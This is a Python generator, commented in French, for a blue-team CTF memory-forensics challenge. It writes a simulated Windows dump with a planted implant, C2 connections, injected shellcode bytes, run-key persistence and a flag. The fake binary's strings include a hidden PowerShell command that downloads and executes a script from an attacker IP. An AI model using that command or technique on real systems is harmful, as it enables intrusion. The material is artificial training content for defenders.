#!/usr/bin/env python3
"""
=============================================================================
  Blue Team CTF – Memory Dump Challenge Generator
  Jakub – Mémoire et analyse de malware (Volatility)
=============================================================================
Génère un fichier memory.dmp simulé contenant :
  - Une table de processus Windows réaliste (EPROCESS-like)
  - Un processus malveillant injecté (implant C2)
  - Des sections mémoire marquées RWX (malfind)
  - Des connexions réseau actives (netscan)
  - Un binaire malveillant caché avec strings C2 + flag
  - Un fichier PCAP bonus avec trafic C2

Le dump est un format binaire structuré lisible par les outils
d'analyse fournis dans tools/.
"""

import struct
import json
import hashlib
import os
import sys
import random
import base64
import time
from datetime import datetime, timedelta

# ─── Configuration du challenge ───────────────────────────────────────────────

CHALLENGE_CONFIG = {
    "flag": "blue{m3m_f0r3ns1cs_v0l4t1l1ty_m4st3r}",
    "c2_domain": "c2.darkops-syndicate.net",
    "c2_ip": "185.141.27.83",
    "c2_port": 4444,
    "c2_backup_port": 8443,
    "malware_name": "svchost_update.exe",
    "malware_pid": 6847,
    "malware_ppid": 1052,      # svchost.exe (session 0) – parentage illogique pour un proc en session 1
    "malware_path": r"C:\Users\admin\AppData\Local\Temp\svchost_update.exe",
    "victim_ip": "192.168.1.47",
    "beacon_interval": 30,
    "encryption_key": "X0rK3y!@#2026",
    "exfil_data": "CONFIDENTIAL_PROJECT_OMEGA_FILES",
}

# ─── Processus légitimes Windows réalistes ─────────────────────────────────────

LEGITIMATE_PROCESSES = [
    {"pid": 4,    "ppid": 0,    "name": "System",              "path": r"",                                                    "threads": 164, "handles": 2847, "session": 0, "create_time": "2026-02-20 08:00:01"},
    {"pid": 108,  "ppid": 4,    "name": "Registry",            "path": r"",                                                    "threads": 4,   "handles": 0,    "session": 0, "create_time": "2026-02-20 08:00:01"},
    {"pid": 392,  "ppid": 4,    "name": "smss.exe",            "path": r"C:\Windows\System32\smss.exe",                        "threads": 2,   "handles": 53,   "session": 0, "create_time": "2026-02-20 08:00:02"},
    {"pid": 520,  "ppid": 504,  "name": "csrss.exe",           "path": r"C:\Windows\System32\csrss.exe",                       "threads": 12,  "handles": 587,  "session": 0, "create_time": "2026-02-20 08:00:04"},
    {"pid": 604,  "ppid": 504,  "name": "wininit.exe",         "path": r"C:\Windows\System32\wininit.exe",                     "threads": 1,   "handles": 77,   "session": 0, "create_time": "2026-02-20 08:00:05"},
    {"pid": 616,  "ppid": 596,  "name": "csrss.exe",           "path": r"C:\Windows\System32\csrss.exe",                       "threads": 13,  "handles": 430,  "session": 1, "create_time": "2026-02-20 08:00:05"},
    {"pid": 700,  "ppid": 596,  "name": "winlogon.exe",        "path": r"C:\Windows\System32\winlogon.exe",                    "threads": 3,   "handles": 197,  "session": 1, "create_time": "2026-02-20 08:00:05"},
    {"pid": 756,  "ppid": 604,  "name": "services.exe",        "path": r"C:\Windows\System32\services.exe",                    "threads": 7,   "handles": 313,  "session": 0, "create_time": "2026-02-20 08:00:06"},
    {"pid": 764,  "ppid": 604,  "name": "lsass.exe",           "path": r"C:\Windows\System32\lsass.exe",                       "threads": 9,   "handles": 1289, "session": 0, "create_time": "2026-02-20 08:00:06"},
    {"pid": 868,  "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 21,  "handles": 905,  "session": 0, "create_time": "2026-02-20 08:00:07"},
    {"pid": 916,  "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 13,  "handles": 471,  "session": 0, "create_time": "2026-02-20 08:00:07"},
    {"pid": 1008, "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 64,  "handles": 1694, "session": 0, "create_time": "2026-02-20 08:00:08"},
    {"pid": 1052, "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 18,  "handles": 653,  "session": 0, "create_time": "2026-02-20 08:00:08"},
    {"pid": 1148, "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 30,  "handles": 822,  "session": 0, "create_time": "2026-02-20 08:00:09"},
    {"pid": 1264, "ppid": 756,  "name": "spoolsv.exe",         "path": r"C:\Windows\System32\spoolsv.exe",                     "threads": 7,   "handles": 312,  "session": 0, "create_time": "2026-02-20 08:00:12"},
    {"pid": 1388, "ppid": 756,  "name": "svchost.exe",         "path": r"C:\Windows\System32\svchost.exe",                     "threads": 9,   "handles": 300,  "session": 0, "create_time": "2026-02-20 08:00:14"},
    {"pid": 1576, "ppid": 756,  "name": "VBoxService.exe",     "path": r"C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxService.exe", "threads": 11, "handles": 140, "session": 0, "create_time": "2026-02-20 08:00:16"},
    {"pid": 2028, "ppid": 756,  "name": "SecurityHealth.exe",  "path": r"C:\Windows\System32\SecurityHealthService.exe",       "threads": 12,  "handles": 347,  "session": 0, "create_time": "2026-02-20 08:00:22"},
    {"pid": 2480, "ppid": 1008, "name": "taskhostw.exe",       "path": r"C:\Windows\System32\taskhostw.exe",                   "threads": 8,   "handles": 185,  "session": 1, "create_time": "2026-02-20 08:01:05"},
    {"pid": 2544, "ppid": 1052, "name": "sihost.exe",          "path": r"C:\Windows\System32\sihost.exe",                      "threads": 11,  "handles": 554,  "session": 1, "create_time": "2026-02-20 08:01:06"},
    {"pid": 2740, "ppid": 700,  "name": "dwm.exe",             "path": r"C:\Windows\System32\dwm.exe",                         "threads": 15,  "handles": 856,  "session": 1, "create_time": "2026-02-20 08:01:08"},
    {"pid": 3200, "ppid": 3128, "name": "explorer.exe",        "path": r"C:\Windows\explorer.exe",                             "threads": 34,  "handles": 1820, "session": 1, "create_time": "2026-02-20 08:01:15"},
    {"pid": 3580, "ppid": 3200, "name": "SecurityHealthTray.exe","path": r"C:\Windows\System32\SecurityHealthSystray.exe",      "threads": 3,   "handles": 113,  "session": 1, "create_time": "2026-02-20 08:01:30"},
    {"pid": 3712, "ppid": 3200, "name": "OneDrive.exe",        "path": r"C:\Users\admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe", "threads": 26, "handles": 754, "session": 1, "create_time": "2026-02-20 08:01:32"},
    {"pid": 4100, "ppid": 756,  "name": "MsMpEng.exe",         "path": r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe","threads": 24, "handles": 480,  "session": 0, "create_time": "2026-02-20 08:01:45"},
    {"pid": 4528, "ppid": 3200, "name": "chrome.exe",          "path": r"C:\Program Files\Google\Chrome\Application\chrome.exe","threads": 30, "handles": 1245, "session": 1, "create_time": "2026-02-20 09:15:22"},
    {"pid": 4680, "ppid": 4528, "name": "chrome.exe",          "path": r"C:\Program Files\Google\Chrome\Application\chrome.exe","threads": 8,  "handles": 217,  "session": 1, "create_time": "2026-02-20 09:15:24"},
    {"pid": 4812, "ppid": 4528, "name": "chrome.exe",          "path": r"C:\Program Files\Google\Chrome\Application\chrome.exe","threads": 15, "handles": 352,  "session": 1, "create_time": "2026-02-20 09:15:25"},
    {"pid": 5124, "ppid": 3200, "name": "notepad.exe",         "path": r"C:\Windows\System32\notepad.exe",                     "threads": 3,   "handles": 87,   "session": 1, "create_time": "2026-02-20 10:30:05"},
    {"pid": 5340, "ppid": 3200, "name": "cmd.exe",             "path": r"C:\Windows\System32\cmd.exe",                         "threads": 1,   "handles": 43,   "session": 1, "create_time": "2026-02-20 14:22:18"},
]

# ─── Processus malveillant ─────────────────────────────────────────────────────

MALICIOUS_PROCESS = {
    "pid": CHALLENGE_CONFIG["malware_pid"],
    "ppid": CHALLENGE_CONFIG["malware_ppid"],   # svchost.exe – mais dans session 1, suspect !
    "name": CHALLENGE_CONFIG["malware_name"],
    "path": CHALLENGE_CONFIG["malware_path"],
    "threads": 5,
    "handles": 142,
    "session": 1,   # session 1 alors que son parent (ppid 1052) est en session 0 → suspect !
    "create_time": "2026-02-20 14:23:47",       # peu après cmd.exe
}

# ─── Connexions réseau ─────────────────────────────────────────────────────────

NETWORK_CONNECTIONS = [
    {"pid": 868,  "proto": "TCPv4", "local": "0.0.0.0:135",           "remote": "0.0.0.0:0",                           "state": "LISTENING"},
    {"pid": 4,    "proto": "TCPv4", "local": "0.0.0.0:445",           "remote": "0.0.0.0:0",                           "state": "LISTENING"},
    {"pid": 916,  "proto": "TCPv4", "local": "0.0.0.0:5040",          "remote": "0.0.0.0:0",                           "state": "LISTENING"},
    {"pid": 1388, "proto": "TCPv4", "local": "192.168.1.47:49672",    "remote": "20.198.119.143:443",                  "state": "ESTABLISHED"},
    {"pid": 4528, "proto": "TCPv4", "local": "192.168.1.47:49801",    "remote": "142.250.74.206:443",                  "state": "ESTABLISHED"},
    {"pid": 4528, "proto": "TCPv4", "local": "192.168.1.47:49803",    "remote": "142.250.74.206:443",                  "state": "ESTABLISHED"},
    {"pid": 3712, "proto": "TCPv4", "local": "192.168.1.47:49780",    "remote": "52.113.194.132:443",                  "state": "ESTABLISHED"},
    # ↓↓↓ Connexion C2 malveillante ↓↓↓
    {"pid": CHALLENGE_CONFIG["malware_pid"], "proto": "TCPv4", "local": f"{CHALLENGE_CONFIG['victim_ip']}:49847",
     "remote": f"{CHALLENGE_CONFIG['c2_ip']}:{CHALLENGE_CONFIG['c2_port']}", "state": "ESTABLISHED"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "proto": "TCPv4", "local": f"{CHALLENGE_CONFIG['victim_ip']}:49902",
     "remote": f"{CHALLENGE_CONFIG['c2_ip']}:{CHALLENGE_CONFIG['c2_backup_port']}", "state": "ESTABLISHED"},
    # ↑↑↑ fin connexion C2 ↑↑↑
    {"pid": 868,  "proto": "UDPv4", "local": "0.0.0.0:5353",          "remote": "*:*",                                 "state": ""},
    {"pid": 1148, "proto": "UDPv4", "local": "0.0.0.0:5355",          "remote": "*:*",                                 "state": ""},
    {"pid": 1008, "proto": "UDPv6", "local": ":::5353",               "remote": "*:*",                                 "state": ""},
]

# ─── Sections mémoire injectées (malfind) ──────────────────────────────────────

def build_shellcode_stub():
    """Construit un faux shellcode réaliste avec les artefacts du challenge."""
    cfg = CHALLENGE_CONFIG
    # Simuler du code PE + shellcode
    pe_header = b"MZ" + b"\x90" * 58 + struct.pack("<I", 0x80)  # DOS header stub
    pe_header += b"\x00" * 64
    pe_header += b"PE\x00\x00"  # PE signature
    pe_header += b"\x4c\x01"     # Machine: i386
    pe_header += b"\x00" * 100

    # Configuration C2 encodée dans le "binaire"
    c2_config = (
        b"\x00" * 32 +
        b"==== BEACON CONFIG ====\x00" +
        f"C2_PRIMARY={cfg['c2_domain']}:{cfg['c2_port']}\x00".encode() +
        f"C2_FALLBACK={cfg['c2_ip']}:{cfg['c2_backup_port']}\x00".encode() +
        f"BEACON_SLEEP={cfg['beacon_interval']}\x00".encode() +
        f"XOR_KEY={cfg['encryption_key']}\x00".encode() +
        f"EXFIL_TAG={cfg['exfil_data']}\x00".encode() +
        b"USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\x00" +
        b"PIPE_NAME=\\\\.\\pipe\\msupdate_47\x00" +
        b"==== END CONFIG ====\x00" +
        b"\x00" * 16 +
        f"FLAG={cfg['flag']}\x00".encode() +
        b"\x00" * 64 +
        b"\xcc" * 32  # INT3 padding
    )

    # Shellcode-like bytes
    shellcode = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    )

    # Ajouter des strings réalistes
    extra_strings = (
        b"\x00" * 16 +
        b"cmd.exe /c whoami\x00" +
        b"cmd.exe /c ipconfig /all\x00" +
        b"cmd.exe /c net user\x00" +
        b"cmd.exe /c systeminfo\x00" +
        b"POST /api/beacon HTTP/1.1\x00" +
        b"Content-Type: application/octet-stream\x00" +
        f"Host: {cfg['c2_domain']}\x00".encode() +
        b"cmd.exe /c powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://" +
        f"{cfg['c2_ip']}/stage2.ps1".encode() + b"')\"\x00" +
        b"\x00" * 32 +
        b"kernel32.dll\x00" +
        b"ntdll.dll\x00" +
        b"ws2_32.dll\x00" +
        b"VirtualAlloc\x00" +
        b"CreateRemoteThread\x00" +
        b"WriteProcessMemory\x00" +
        b"NtUnmapViewOfSection\x00" +
        b"InternetOpenA\x00" +
        b"InternetConnectA\x00" +
        b"HttpSendRequestA\x00" +
        b"\x00" * 48
    )

    return pe_header + shellcode + c2_config + extra_strings


def build_malfind_sections():
    """Sections mémoire suspectes pour malfind."""
    cfg = CHALLENGE_CONFIG
    sections = []

    # Section 1 : injection principale dans le processus malveillant
    sections.append({
        "pid": cfg["malware_pid"],
        "process": cfg["malware_name"],
        "address": "0x00400000",
        "size": 0x1000,
        "protection": "PAGE_EXECUTE_READWRITE",
        "tag": "VadS",
        "description": "Private memory – not mapped to any module",
        "hex_dump": "4d 5a 90 90 90 90 90 90 90 90 90 90 90 90 90 90  MZ..............\n"
                    "90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................\n"
                    "90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................\n"
                    "90 90 90 90 90 90 90 90 90 90 80 00 00 00 00 00  ................",
        "disasm": "0x00400000: dec  ebp\n"
                  "0x00400001: pop  edx\n"
                  "0x00400002: nop\n"
                  "0x00400003: nop\n"
                  "0x00400004: nop\n"
                  "0x00400005: nop\n"
                  "0x00400006: nop\n"
                  "0x00400007: nop\n",
    })

    # Section 2 : shellcode injecté dans explorer.exe (pivot)
    sections.append({
        "pid": 3200,
        "process": "explorer.exe",
        "address": "0x02A10000",
        "size": 0x800,
        "protection": "PAGE_EXECUTE_READWRITE",
        "tag": "VadS",
        "description": "Private memory – not mapped to any module (injected code)",
        "hex_dump": "fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30  ..........1.d.P0\n"
                    "8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff  .R..R..r(..J&1.\n"
                    "ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52  .<a|., .......R\n"
                    "57 8b 52 10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1  W.R..J<.L.x.H..",
        "disasm": "0x02A10000: cld\n"
                  "0x02A10001: call   0x02A10088\n"
                  "0x02A10006: pushad\n"
                  "0x02A10007: mov    ebp, esp\n"
                  "0x02A10009: xor    eax, eax\n"
                  "0x02A1000B: mov    edx, dword ptr fs:[eax + 0x30]\n",
    })

    return sections


# ─── DLLs suspectes chargées ───────────────────────────────────────────────────

DLL_LIST_MALICIOUS = [
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x00400000", "size": "0x15000",  "name": CHALLENGE_CONFIG["malware_name"], "path": CHALLENGE_CONFIG["malware_path"]},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x77000000", "size": "0x1B2000", "name": "ntdll.dll",        "path": r"C:\Windows\System32\ntdll.dll"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x76E00000", "size": "0x110000", "name": "kernel32.dll",     "path": r"C:\Windows\System32\kernel32.dll"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x76200000", "size": "0x9F000",  "name": "ws2_32.dll",       "path": r"C:\Windows\System32\ws2_32.dll"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x74A00000", "size": "0x93000",  "name": "wininet.dll",      "path": r"C:\Windows\System32\wininet.dll"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "base": "0x74800000", "size": "0x25000",  "name": "winhttp.dll",      "path": r"C:\Windows\System32\winhttp.dll"},
]

# ─── Handles suspects ──────────────────────────────────────────────────────────

HANDLES_MALICIOUS = [
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x4",   "type": "File",    "name": r"\Device\HarddiskVolume3\Users\admin\AppData\Local\Temp\svchost_update.exe"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x1C",  "type": "Key",     "name": r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x24",  "type": "Mutant",  "name": r"\Sessions\1\BaseNamedObjects\Global\MSUpdateCheck_47"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x34",  "type": "File",    "name": r"\Device\NamedPipe\msupdate_47"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x48",  "type": "Section", "name": r"\Sessions\1\BaseNamedObjects\ShimSharedMemory"},
    {"pid": CHALLENGE_CONFIG["malware_pid"], "handle": "0x58",  "type": "Event",   "name": r"\KernelObjects\CritSecOutOfMemoryEvent"},
]

# ─── Registre (persistence) ───────────────────────────────────────────────────

REGISTRY_ARTIFACTS = [
    {
        "key": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "value_name": "WindowsSecurityUpdate",
        "value_type": "REG_SZ",
        "value_data": CHALLENGE_CONFIG["malware_path"],
    },
    {
        "key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
        "value_name": "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\svchost_update.exe",
        "value_type": "REG_BINARY",
        "value_data": "ROT13 encoded run count",
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
#   Génération du dump binaire
# ═══════════════════════════════════════════════════════════════════════════════

MAGIC = b"MEMDUMP1"   # Signature du fichier
VERSION = 1

SECTION_PROCESS_TABLE  = 0x01
SECTION_NETWORK_TABLE  = 0x02
SECTION_MALFIND        = 0x03
SECTION_MALWARE_BINARY = 0x04
SECTION_DLL_LIST       = 0x05
SECTION_HANDLES        = 0x06
SECTION_REGISTRY       = 0x07
SECTION_METADATA       = 0xFF


def write_section(fp, section_type, data):
    """Écrit une section : [type:1][size:4][data:N]"""
    raw = json.dumps(data, ensure_ascii=False).encode("utf-8")
    fp.write(struct.pack("<BI", section_type, len(raw)))
    fp.write(raw)


def generate_memory_dump(output_dir):
    """Génère le fichier memory.dmp dans output_dir."""
    os.makedirs(output_dir, exist_ok=True)
    dump_path = os.path.join(output_dir, "memory.dmp")

    # Table des processus complète
    all_processes = LEGITIMATE_PROCESSES + [MALICIOUS_PROCESS]
    random.shuffle(all_processes)  # mélanger pour ne pas mettre le malware à la fin

    # Binaire malveillant
    malware_binary = build_shellcode_stub()
    malware_b64 = base64.b64encode(malware_binary).decode()

    # Métadonnées système
    metadata = {
        "image_type": "Windows 10 19045 x64",
        "kdbg_offset": "0xf8047e6009a0",
        "dtb": "0x1aa000",
        "hostname": "DESKTOP-F4K3LAB",
        "username": "admin",
        "capture_time": "2026-02-20 15:00:00",
        "capture_tool": "WinPmem 4.0",
        "memory_size": "4294967296",
    }

    # Malfind sections
    malfind_sections = build_malfind_sections()

    with open(dump_path, "wb") as fp:
        # ── Header ──
        fp.write(MAGIC)
        fp.write(struct.pack("<H", VERSION))

        # Padding aléatoire (simule un vrai header)
        fp.write(os.urandom(64))

        # ── Sections ──
        write_section(fp, SECTION_METADATA, metadata)
        write_section(fp, SECTION_PROCESS_TABLE, all_processes)
        write_section(fp, SECTION_NETWORK_TABLE, NETWORK_CONNECTIONS)
        write_section(fp, SECTION_MALFIND, malfind_sections)
        write_section(fp, SECTION_MALWARE_BINARY, {
            "pid": CHALLENGE_CONFIG["malware_pid"],
            "name": CHALLENGE_CONFIG["malware_name"],
            "binary_b64": malware_b64,
            "sha256": hashlib.sha256(malware_binary).hexdigest(),
            "md5": hashlib.md5(malware_binary).hexdigest(),
        })
        write_section(fp, SECTION_DLL_LIST, DLL_LIST_MALICIOUS)
        write_section(fp, SECTION_HANDLES, HANDLES_MALICIOUS)
        write_section(fp, SECTION_REGISTRY, REGISTRY_ARTIFACTS)

        # Padding final avec du bruit
        fp.write(os.urandom(4096))

    size = os.path.getsize(dump_path)
    print(f"[+] Dump mémoire généré : {dump_path} ({size:,} octets)")
    return dump_path


# ═══════════════════════════════════════════════════════════════════════════════
#   Génération du hints.txt
# ═══════════════════════════════════════════════════════════════════════════════

def generate_hints(output_dir):
    hints_path = os.path.join(output_dir, "hints.txt")
    hints = """
╔══════════════════════════════════════════════════════════════╗
║                    💡 INDICES (Hints)                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Hint 1 (Facile):                                            ║
║    Un svchost légitime est TOUJOURS enfant de services.exe   ║
║    Regarde bien les PPID...                                  ║
║                                                              ║
║  Hint 2 (Moyen):                                             ║
║    L'attaquant n'a pas pris la peine de chiffrer sa config   ║
║    dans le binaire. 'strings' est ton ami.                   ║
║                                                              ║
║  Hint 3 (Avancé):                                            ║
║    Le malware utilise un named pipe pour la communication    ║
║    inter-processus. Cherche les handles de type Mutant       ║
║    et NamedPipe.                                             ║
║                                                              ║
║  Hint 4 (Bonus):                                             ║
║    Corrèle les connexions réseau avec le PID suspect.        ║
║    Le C2 écoute sur deux ports différents.                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
    with open(hints_path, "w", encoding="utf-8") as f:
        f.write(hints.strip())
    print(f"[+] Hints générés : {hints_path}")


# ═══════════════════════════════════════════════════════════════════════════════
#   Point d'entrée
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.dirname(script_dir)
    challenge_dir = os.path.join(project_dir, "challenge")

    print("=" * 60)
    print("  🔵 Blue Team CTF – Générateur de Challenge Mémoire")
    print("=" * 60)
    print()

    dump_path = generate_memory_dump(challenge_dir)
    generate_hints(challenge_dir)

    print()
    print("[✓] Challenge prêt ! Fichiers dans :", challenge_dir)
    print()
    print("  Prochaines étapes :")
    print("    1. Lancez les outils d'analyse :  python tools/vol_analyzer.py -f challenge/memory.dmp <commande>")
    print("    2. Consultez le README.md pour les instructions du challenge")
    print("    3. La solution est dans solution/SOLUTION.md")
    print()


if __name__ == "__main__":
    main()
